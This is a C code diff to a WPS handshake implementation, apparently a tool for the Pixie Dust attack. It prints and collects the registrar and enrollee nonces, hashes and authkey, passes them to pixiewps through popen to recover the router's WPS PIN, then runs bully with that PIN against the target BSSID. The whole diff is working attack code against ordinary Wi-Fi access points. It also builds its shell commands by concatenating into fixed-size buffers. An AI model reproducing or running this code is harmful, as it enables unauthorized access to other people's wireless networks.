@@ -1336,12 +1336,19 @@ static struct wpabuf * wps_build_m2(struct wps_data *wps)
         /****** ADD THIS PART ******/
 	if (*pixierun > 0)
 	{
+		memset(cmd_pixie_aux,0,sizeof(cmd_pixie_aux));
+		memset(pixie_rnonce,0,sizeof(pixie_rnonce));
+
 		printf("[P] R-Nonce: ");
+
 		int pixiecnt = 0;
 		for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) {
 			printf("%02x", wps->nonce_r[pixiecnt]);
+			sprintf(cmd_pixie_aux, "%02x", wps->nonce_r[pixiecnt]);
+			strcat(pixie_rnonce, cmd_pixie_aux);
 			if (pixiecnt != WPS_NONCE_LEN - 1) {
 				printf(":");
+				strcat(pixie_rnonce,":");
 			}
 	        }
 	        printf("\n");
@@ -1685,10 +1692,8 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
 		memset(cmd_pixie_aux,0,sizeof(cmd_pixie_aux));
 		memset(pixie_enonce,0,sizeof(pixie_enonce));
 		
-		if ( pixierun == "1")
-		{
-	        	printf("[P] E-Nonce: ");
-		}
+		printf("[P] E-Nonce: ");
+		
 		int pixiecnt = 0;
 	        for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) 
 	        {
@@ -1778,6 +1783,7 @@ static int wps_process_e_hash1(struct wps_data *wps, const u8 *e_hash1)
 			strcat(pixie_ehash1, cmd_pixie_aux);
 			if (pixiecnt != WPS_HASH_LEN - 1) {
 				printf(":");
+				strcat(pixie_ehash1,":");
 			}
 		}
 		printf("\n");
@@ -1830,6 +1836,9 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 		strcat(cmd_pixie,pixie_authkey);
 		strcat(cmd_pixie," -n ");
 		strcat(cmd_pixie,pixie_enonce);
+		strcat(cmd_pixie," -m ");
+		strcat(cmd_pixie,pixie_rnonce);
+		//strcat(cmd_pixie," --mode 1,2,3,4,5 ");
 	
 		FILE *fpixe;
 	        if ((fpixe = popen(cmd_pixie, "r")) == NULL) {
@@ -1843,7 +1852,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 	        memset(pixie_pin, 0, sizeof(pixie_pin));
 	
 		printf("[+] Running pixiewps with the information, wait ...\n");
-		//printf("Cmd : %s\n",cmd_pixie);
+		printf("Cmd : %s\n",cmd_pixie);
 		
 		while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) 
 		{
@@ -1886,7 +1895,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 				strcat(cmd_bully_test_aux,p_bssid);
 				strcat(cmd_bully_test_aux," -p ");
 				strcat(cmd_bully_test_aux,pixie_pin);
-				strcat(cmd_bully_test_aux," -B --force ");
+				strcat(cmd_bully_test_aux," -B --force -L ");
 				strcat(cmd_bully_test_aux,p_iface);
 	
 				printf("[+] Running bully with the correct pin, wait ...\n");
@@ -1897,6 +1906,7 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 	                	}
 				while (fgets(pixie_buf_aux2, 4000, fpixe_test) != NULL) 
 				{
+					//printf("[Bully Test] %s", pixie_buf_aux2);
 					if(strstr(pixie_buf_aux2,"	PIN : ")!=NULL)
 					{
 						printf("[Bully Test] %s", pixie_buf_aux2);
